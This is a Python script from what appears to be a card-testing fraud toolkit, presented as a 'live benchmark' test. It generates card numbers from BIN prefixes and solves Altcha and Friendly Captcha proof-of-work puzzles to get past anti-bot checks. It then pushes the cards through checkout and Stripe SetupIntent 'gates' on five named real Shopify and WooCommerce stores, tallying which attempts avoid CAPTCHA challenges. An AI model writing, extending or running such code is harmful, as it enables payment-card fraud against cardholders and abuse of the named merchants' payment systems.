# language: Python 3.12+, file: scratch/test_live_multigate_challenge.py, target: Windows 11
import asyncio
import base64
import hashlib
import json
import os
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", line_buffering=True)

import gate_client as gc
import shopify_gate as sg
import store_gate as stg
import setup_gate as supg
from captcha_pow import solve_altcha, create_altcha_payload, solve_friendly_captcha, detect_pow_type
import config

BIN_PREFIXES = [
    "453927", "448528", "517546", "440393", "379363",
    "411111", "555555", "400000", "520000", "378282",
]

def gen_10_cards():
    cards = []
    for prefix in BIN_PREFIXES[:10]:
        probe = gc.gen_probe_card(prefix)
        cards.append(str(probe["number"]) + "|" + str(probe["mm"]) + "|" + str(probe["yy"]) + "|" + str(probe["cvc"]))
    return cards

def test_pow_solvers():
    print("=" * 80)
    print("[*] 1. LOCAL PROOF-OF-WORK CAPTCHA SOLVER BENCHMARK")
    print("=" * 80)
    salt = "benchmark_salt_xyz"
    secret_nonce = 42500
    challenge = hashlib.sha256((salt + str(secret_nonce)).encode("ascii")).hexdigest()
    t0 = time.perf_counter()
    res_altcha = solve_altcha(challenge=challenge, salt=salt, max_number=100_000)
    dt_altcha = (time.perf_counter() - t0) * 1000
    assert res_altcha is not None
    assert res_altcha["solution"] == secret_nonce
    payload = create_altcha_payload({"challenge": challenge, "salt": salt, "algorithm": "SHA-256"}, res_altcha["solution"])
    print(f"[+] Altcha PoW Solved in {dt_altcha:.2f}ms (solution={res_altcha['solution']}, payload_len={len(payload)})")

    raw = bytearray(36)
    raw[18] = 1
    raw[19] = 100  # Easy difficulty benchmark
    raw[28:36] = b"12345678"
    b64_puzzle = base64.b64encode(raw).decode("utf-8")
    puzzle_str = f"test_sig.{b64_puzzle}"
    t0 = time.perf_counter()
    res_frc = solve_friendly_captcha(puzzle_str, max_iterations=50_000)
    dt_frc = (time.perf_counter() - t0) * 1000
    assert res_frc is not None
    print(f"[+] Friendly Captcha PoW Solved in {dt_frc:.2f}ms (hashes={res_frc['hashes_computed']}, rate={res_frc['hash_rate']} H/s)")

    sample_html = ("<div>Normal Content</div>"
                   "<div class=\"cf-turnstile-wrapper\" data-sitekey=\"0x4AAAAAA\"></div>"
                   "<altcha-widget challengeurl=\"/api/altcha-challenge\"></altcha-widget>")
    detected_pow = detect_pow_type(sample_html)
    assert detected_pow is not None and detected_pow["type"] == "altcha"
    assert not gc.is_cloudflare_challenge(sample_html)
    print("[+] Anti-Bot Challenge Discrimination: Altcha detected, cf-turnstile-wrapper permitted without FP block.")
    print("=" * 80)

async def benchmark_store(platform_name, store_url, check_coro_fn, cards, proxy=None):
    print(f"\n[>>>] Benchmarking {platform_name}: {store_url}")
    print(f"      Cards: {len(cards)} | Proxy: {proxy or 'direct'}")
    results = []
    latencies = []
    bot_challenges = 0
    clean_verdicts = 0
    errors = 0

    for idx, card in enumerate(cards, 1):
        t0 = time.perf_counter()
        masked = gc.mask_pan(card)
        try:
            res = await check_coro_fn(store_url, card, proxy=proxy)
            elapsed_ms = int((time.perf_counter() - t0) * 1000)
            latencies.append(elapsed_ms)
            st = res.get("status", "UNKNOWN")
            det = res.get("detail", "")
            if "CAPTCHA" in st or "CF_BLOCKED" in st or "challenge" in det.lower():
                bot_challenges += 1
                flag = "SHIELD: CAPTCHA/CHALLENGE"
            elif st in ("ERROR", "UNKNOWN"):
                errors += 1
                flag = "WARN: ERROR"
            else:
                clean_verdicts += 1
                flag = "PASS: CLEAN_VERDICT"
            print(f"  [{idx:02d}/10] {masked} -> {st} ({elapsed_ms}ms) | {flag} | {det[:70]}")
            results.append({"card": masked, "status": st, "detail": det[:100], "latency_ms": elapsed_ms})
        except Exception as e:
            elapsed_ms = int((time.perf_counter() - t0) * 1000)
            errors += 1
            print(f"  [{idx:02d}/10] {masked} -> EXCEPTION ({elapsed_ms}ms): {e}")
            results.append({"card": masked, "status": "EXCEPTION", "detail": str(e), "latency_ms": elapsed_ms})
        await asyncio.sleep(0.5)

    avg_lat = int(sum(latencies) / len(latencies)) if latencies else 0
    summary = {
        "platform": platform_name,
        "store_url": store_url,
        "total_cards": len(cards),
        "clean_verdicts": clean_verdicts,
        "bot_challenges": bot_challenges,
        "errors": errors,
        "avg_latency_ms": avg_lat,
        "results": results
    }
    print(f"[<<<] Completed {store_url}: clean={clean_verdicts}/10, challenges={bot_challenges}/10, errors={errors}/10, avg_lat={avg_lat}ms")
    return summary

async def main():
    test_pow_solvers()
    proxy = None
    print("[*] РЕЖИМ: Прямое соединение (БЕЗ ПРОКСИ)")
    cards = gen_10_cards()
    all_summaries = []

    async def shopify_checker(target, card, proxy):
        return await sg.check_target(target, card, proxy=proxy, max_price_cents=2000)

    async def store_checker(target, card, proxy):
        return await stg.check_target(target, card, proxy, max_price_cents=2000)

    ready_list = supg.load_ready_gates()
    gs_setup = supg.GateSession(ready_list[0], proxy=proxy)
    ok_setup, det_setup = await gs_setup.open()
    print(f"[*] SetupIntent donor {ready_list[0].get('domain')} opened: {ok_setup} | {det_setup}")

    async def setup_checker(target, card, proxy):
        if not ok_setup:
            return {"status": "ERROR", "detail": f"Donor open failed: {det_setup}"}
        return await gs_setup.check_card(card)

    targets_to_run = [
        ("Shopify", "https://sparkcandles.com", shopify_checker),
        ("Shopify", "https://sweetharvestfarms.com", shopify_checker),
        ("WooCommerce Store API", "https://rocketgeek.com", store_checker),
        ("WooCommerce Store API", "https://forageplus.co.uk", store_checker),
        ("WooCommerce SetupIntent", "https://www.blackbeltprotein.com.au", setup_checker)
    ]

    for plat, store, fn in targets_to_run:
        summary = await benchmark_store(plat, store, fn, cards, proxy=proxy)
        all_summaries.append(summary)

    out_path = os.path.join(str(ROOT), "scratch", "live_captcha_verification_report.json")
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(all_summaries, f, indent=2, ensure_ascii=False)
    print("\n" + "=" * 80)
    print(f"[+] LIVE VERIFICATION COMPLETED ACROSS {len(targets_to_run)} STORES (50 CARDS TOTAL)")
    print(f"[+] Report saved to: {out_path}")
    print("=" * 80)

if __name__ == "__main__":
    asyncio.run(main())
